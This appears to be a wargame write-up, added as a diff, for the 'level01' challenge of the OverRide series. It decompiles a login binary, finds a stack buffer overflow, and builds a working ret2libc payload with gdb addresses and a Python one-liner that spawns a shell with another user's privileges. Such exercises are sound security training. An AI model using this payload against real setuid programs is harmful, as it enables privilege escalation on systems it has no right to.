@@ -1,0 +1,193 @@
+# level01
+
+## Testing the binary
+
+```sh
+$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username:         
+verifying username....
+
+nope, incorrect username...
+$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username:         
+verifying username....
+
+nope, incorrect username...
+
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+verifying username....
+
+nope, incorrect username...
+```
+
+Okay, so I guess I must find the username anyway.
+
+## Disassembly
+
+```c
+#include <stdio.h>
+
+char a_user_name[100]; // buffer @ 0x0804a040 -> 0x0804a0a3 
+
+int main(void)
+{
+  int ret;
+  char buffer[16] = {0};
+
+  puts("********* ADMIN LOGIN PROMPT *********");
+  printf("Enter Username: ");
+  fgets(&a_user_name, 256, stdin);
+  if (verify_user_name() == 0) {
+    puts("Enter Password: ");
+    fgets(buffer, 100, stdin);
+    int passValid = verify_user_pass(buffer);
+    if ((passValid == 0) || (passValid != 0)) {
+      puts("nope, incorrect password...\n");
+      ret = 1;
+    }
+    else {
+      ret = 0;
+    }
+  }
+  else {
+    puts("nope, incorrect username...\n");
+    ret = 1;
+  }
+  return ret;
+}
+
+int verify_user_name()
+{
+  return strncmp(&a_user_name, "dat_wil", 7);
+}
+
+int verify_user_pass(char *buffer)
+{
+  return strncmp(buffer, "admin", 5);
+}
+```
+
+### Static analysis
+
+While disassembling the binary, I thought I made a mistake because I saw the `buffer[16]` variable being written to with `fgets(buffer, 100, stdin);`. But then I realized that `100` > `16`, so there's a buffer overflow.
+
+```sh
+./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+nope, incorrect password...
+
+Segmentation fault (core dumped)
+```
+
+Indeed, there is a segfault.
+
+### Dynamic analysis
+
+As we can see, there's no other function in the binary (see the [source here](source)). There's multiple ways of exploiting this binary, we will do a quick `ret2libc` attack to return to the `system` function, using the `/bin/sh` string that is in the libc.
+
+```c
+$ gdb -q ./level01
+Reading symbols from /home/users/level01/level01...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x80484d5
+(gdb) r
+Starting program: /home/users/level01/level01 
+
+Breakpoint 1, 0x080484d5 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) info proc map
+process 1837
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+        0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+        0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+        0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+        0xf7e2b000 0xf7e2c000     0x1000        0x0 
+        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+        0xf7fd0000 0xf7fd4000     0x4000        0x0 
+        0xf7fda000 0xf7fdb000     0x1000        0x0 
+        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:      "/bin/sh"
+```
+
+## Solution
+
+Let's write a quick python payload. The [buffer we're overflowing](source#L8) is 16 bytes.
+
+### `eip` register offset
+
+```sh
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x1       
+$ebx   : 0x61616172 ("raaa"?)
+$ecx   : 0xf7f959b8  →  0x00000000
+$edx   : 0x0       
+$esp   : 0xffffcc30  →  "vaaawaaaxaaayaa"
+$ebp   : 0x61616174 ("taaa"?)
+$esi   : 0x080485c0  →  <__libc_csu_init+0> push ebp
+$edi   : 0x61616173 ("saaa"?)
+$eip   : 0x61616175 ("uaaa"?)
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffcc30│+0x0000: "vaaawaaaxaaayaa"    ← $esp
+0xffffcc34│+0x0004: "waaaxaaayaa"
+0xffffcc38│+0x0008: "xaaayaa"
+0xffffcc3c│+0x000c: 0x00616179 ("yaa"?)
+0xffffcc40│+0x0010: 0xf7f93ff4  →  0x001e7d8c
+0xffffcc44│+0x0014: 0x080484d0  →  <main+0> push ebp
+0xffffcc48│+0x0018: 0x00000001
+0xffffcc4c│+0x001c: 0xffffcce4  →  0xffffcec4  →  "/home/molly/goinfre/override/level01_bin"
+──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x61616175
+──────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "level01_bin", stopped 0x61616175 in ?? (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────── trace ────
+─────────────────────────────────────────────────────────────────────────────────────────────────────
+Missing separate debuginfos, use: dnf debuginfo-install glibc-2.37-13.fc38.i686
+gef➤  
+gef➤  pattern search 0x61616175
+[+] Searching for '75616161'/'61616175' with period=4
+[+] Found at offset 80 (little-endian search) likely
+```
+
+```sh
+$ export BIN_SH_ADDR=0xf7f897ec
+$ export SYSTEM_ADDR=0xf7e6aed0
+$ export OVERFLOW_SIZE=80
+$ echo 'dat_wil' > /tmp/payload.01
+$ python -c "import struct;PAYLOAD = 'A' * $OVERFLOW_SIZE + struct.pack('<I', $SYSTEM_ADDR) +'AAAA' +  struct.pack('<I', $BIN_SH_ADDR);print PAYLOAD" >> /tmp/payload.01
+$ cat /tmp/payload.01 - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+id
+uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
+```
